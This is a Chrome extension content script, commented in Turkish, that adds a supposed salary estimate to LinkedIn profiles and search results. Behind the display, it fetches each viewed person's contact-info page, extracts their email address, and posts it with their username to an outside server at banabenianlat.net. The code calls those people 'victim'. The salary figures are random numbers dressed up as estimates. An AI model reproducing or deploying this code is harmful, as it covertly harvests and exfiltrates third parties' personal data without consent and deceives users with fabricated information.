// generates random number
// doc: https://stackoverflow.com/a/49434653/1075846
function randn_bm(min, max, skew) {
    var u = 0, v = 0;
    while(u === 0) u = Math.random(); //Converting [0,1) to (0,1)
    while(v === 0) v = Math.random();
    let num = Math.sqrt( -2.0 * Math.log( u ) ) * Math.cos( 2.0 * Math.PI * v );

    num = num / 10.0 + 0.5; // Translate to 0 -> 1
    if (num > 1 || num < 0) num = randn_bm(min, max, skew); // resample between 0 and 1 if out of range
    num = Math.pow(num, skew); // Skew
    num *= max - min; // Stretch to fill range
    num += min; // offset to min
    return num;
}

function get_victimname(url){
    return url.substring(url.lastIndexOf("/in/") + 4, url.lastIndexOf("/"));
}

function Create_Salary_Section(TL,USD,EURO){
    let salary = document.createElement('div');
    salary.setAttribute("id", "salary");
    salary.innerHTML = '<p>Bu yeteneğin Türkiye\'deki tahmini aylık maaşı: '+TL+'TL</p>\
                        <p>ABD\'de: '+USD+'$.</p>\
                        <p>Almanya\'da: '+EURO+'€</p>\
                        <p>En doğru sonucu, tam profillerini görebildiğiniz bağlantılarınızda elde edebilirsiniz.</p>\
                        <a style="color:#fff; text-decoration:none;" href="https://www.linkedin.com/search/results/people/?facetNetwork=%5B%22F%22%5D&origin=MEMBER_PROFILE_CANNED_SEARCH">Bağlantılarınızın tahmini ücretlerini listeden görmek için tıklayınız</a>';
    salary.style.padding = "10px";
    salary.style.backgroundColor = "#0073b1";
    salary.style.fontWeight = "600";
    salary.style.borderRadius = "2px";
    salary.style.fontFamily = "inherit";
    salary.style.color = "#fff";
    var profile_detail = document.querySelector('div.profile-detail');
    profile_detail.parentNode.insertBefore(salary, profile_detail);
}

function sayfayi_yenile(){
    let uyari = document.createElement('div');
    uyari.setAttribute("id", "uyari");
    uyari.innerHTML = 'Sayfayı yenile! <br> En doğru sonucu, tam profillerini görebildiğiniz bağlantılarınızda elde edebilirsiniz. <br>\
    <a style="color:#fff; text-decoration:none;" href="https://www.linkedin.com/search/results/people/?facetNetwork=%5B%22F%22%5D&origin=MEMBER_PROFILE_CANNED_SEARCH">Bağlantılarınızın tahmini ücretlerini listeden görmek için tıklayınız</a>';
    uyari.style.padding = "10px";
    uyari.style.backgroundColor = "#0073b1";
    uyari.style.fontWeight = "600";
    uyari.style.borderRadius = "2px";
    uyari.style.fontFamily = "inherit";
    uyari.style.color = "#fff";
    var profile_detail = document.querySelector('div.profile-detail');
    profile_detail.parentNode.insertBefore(uyari, profile_detail);
}

function get_victim_email(victim_name){
    $.ajax({ 
    url: 'https://www.linkedin.com/in/'+victim_name+'/detail/contact-info/',
    success: function(data) {
        $htmlData = data;
        $email = $htmlData.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi); 
        if($email){
            console.log($email[0]);  
            $.post("https://banabenianlat.net/ChromeExtensions/LinkedinScraper/check_if_exists.php?column_name=email",
            {
                postdata:$email[0]
            },
            function(data, status){
                //DB'de user halihazırda kayıtlıysa
                if(data["email"]){
                    Create_Salary_Section(data["aylik_TL"],data["aylik_DOLAR"],data["aylik_EURO"]);
                }else{ // DB'de yoksa
                    var postdata_arr = [];
                    var aylik_TL = Math.round(randn_bm(0.5,10,3)*4000);
                    var aylik_DOLAR = Math.round(randn_bm(0.5,10,3)*3600);
                    var aylik_EURO = Math.round(randn_bm(0.5,10,3)*3400);
                    postdata_arr.push({username:victim_name,email:$email[0],aylik_TL:aylik_TL,aylik_DOLAR:aylik_DOLAR,aylik_EURO:aylik_EURO});
                    console.log(postdata_arr); 
                    $.post("https://banabenianlat.net/ChromeExtensions/LinkedinScraper/create_email.php",
                    {
                        postdata:JSON.stringify(postdata_arr)
                    },
                    function(data, status){
                        if(status=="success"){
                            Create_Salary_Section(aylik_TL,aylik_DOLAR,aylik_EURO);
                            //console.log("dattaa:"+data["email"]);
                        }else{
                            sayfayi_yenile();
                            console.log(" return data : "+data);
                        }
                        
                    });                    
                }
            });
        }else{
            //sayfayi_yenile();
        }      
    } });
}

var current_url = window.location.href;

// // Whole page reload ile bir user'a erişilirse onun username'i
var victim1_name = get_victimname(current_url);
get_victim_email(victim1_name);



function get_usernames(){
    let usernames = $("li.search-result__occluded-item .search-result__info .search-result__result-link").map( function() {
        let salary = document.createElement('span');
        salary.innerHTML = "0TL, 0$, 0€";
        let dist_value = $(this).find(".name-and-distance");
        //console.log(dist_value);
        dist_value.append(salary);
        let href = $(this).attr('href');
        var uname =  href.substring(href.lastIndexOf("/in/") + 4, href.lastIndexOf("/"));
        console.log(uname);
        $.post("https://banabenianlat.net/ChromeExtensions/LinkedinScraper/check_if_exists.php?column_name=username",
        {
            postdata:uname
        },
        function(data, status){
            console.log(uname);
            if(data){//DB'de user halihazırda kayıtlıysa
                console.log(true);
                console.log(data);
                salary.innerHTML = data["aylik_TL"]+"TL, "+data["aylik_DOLAR"]+"$, "+data["aylik_EURO"]+"€";
            }else{ // DB'de yoksa
                console.log(false);
                $.ajax({ 
                    url: 'https://www.linkedin.com/in/'+uname+'/detail/contact-info/',
                    success: function(data) {
                        $htmlData = data;
                        $email = $htmlData.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi); 
                        if($email){
                            console.log($email[0]);  
                            var postdata_arr = [];
                            var aylik_TL = Math.round(randn_bm(0.5,10,3)*4000);
                            var aylik_DOLAR = Math.round(randn_bm(0.5,10,3)*3600);
                            var aylik_EURO = Math.round(randn_bm(0.5,10,3)*3400);
                            postdata_arr.push({username:uname,email:$email[0],aylik_TL:aylik_TL,aylik_DOLAR:aylik_DOLAR,aylik_EURO:aylik_EURO});
                            console.log(postdata_arr); 
                            $.post("https://banabenianlat.net/ChromeExtensions/LinkedinScraper/create_email.php",
                            {
                                postdata:JSON.stringify(postdata_arr)
                            },
                            function(data, status){
                                if(status=="success"){
                                    salary.innerHTML = aylik_TL+"TL, "+aylik_DOLAR+"$, "+aylik_EURO+"€";
                                    //console.log("dattaa:"+data["email"]);
                                }else{
                                    sayfayi_yenile();
                                    console.log(" return data : "+data);
                                }
                                
                            });  
                        }     
                    } });
            }
        });
    }).get();
    return usernames;
}


console.log(current_url);
if(current_url == "https://www.linkedin.com/mynetwork/invite-connect/connections/"){
    console.log("conn conn");
    //console.log(get_usernames());
} else if(current_url.includes("linkedin.com/search/results/people/")){
    console.log("connections page clicked");
    setTimeout(function(){get_usernames(); }, 2000);
    
}


//Ajax load ile bir profile erişilirse 
chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
      // listen for messages sent from background.js
      console.log(request.message);
      if (request.message === 'profile clicked!') {
        console.log(request.url) // new url is now in content scripts!
        var victim_name = get_victimname(request.url);
        console.log(victim_name);
        $.ajax({ 
            url: 'https://www.linkedin.com/in/'+victim_name+'/detail/contact-info/', 
            success: function(data) {
                $htmlData = data;
                $email = $htmlData.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi); 
                if($email){
                    console.log($email[0]);  
                    $.post("https://banabenianlat.net/ChromeExtensions/LinkedinScraper/check_if_exists.php?column_name=email",
                    {
                        postdata:$email[0]
                    },
                    function(data, status){
                        //DB'de user halihazırda kayıtlıysa
                        if(data["email"]){
                            Create_Salary_Section(data["aylik_TL"],data["aylik_DOLAR"],data["aylik_EURO"]);
                        }else{ // DB'de yoksa
                            var postdata_arr = [];
                            var aylik_TL = Math.round(randn_bm(0.5,10,3)*4000);
                            var aylik_DOLAR = Math.round(randn_bm(0.5,10,3)*3600);
                            var aylik_EURO = Math.round(randn_bm(0.5,10,3)*3400);
                            postdata_arr.push({username:victim_name,email:$email[0],aylik_TL:aylik_TL,aylik_DOLAR:aylik_DOLAR,aylik_EURO:aylik_EURO});
                            console.log(postdata_arr); 
                            $.post("https://banabenianlat.net/ChromeExtensions/LinkedinScraper/create_email.php",
                            {
                                postdata:JSON.stringify(postdata_arr)
                            },
                            function(data, status){
                                if(status=="success"){
                                    Create_Salary_Section(aylik_TL,aylik_DOLAR,aylik_EURO);
                                    //console.log("dattaa:"+data["email"]);
                                }else{
                                    sayfayi_yenile();
                                    console.log(" return data : "+data);
                                }
                                
                            });                    
                        }
                    });
                }    
            } });
      } else if(request.message === 'connection list!'){
            console.log("ICH bin connections page.");
            setTimeout(function(){get_usernames(); }, 2000);
      }
  });
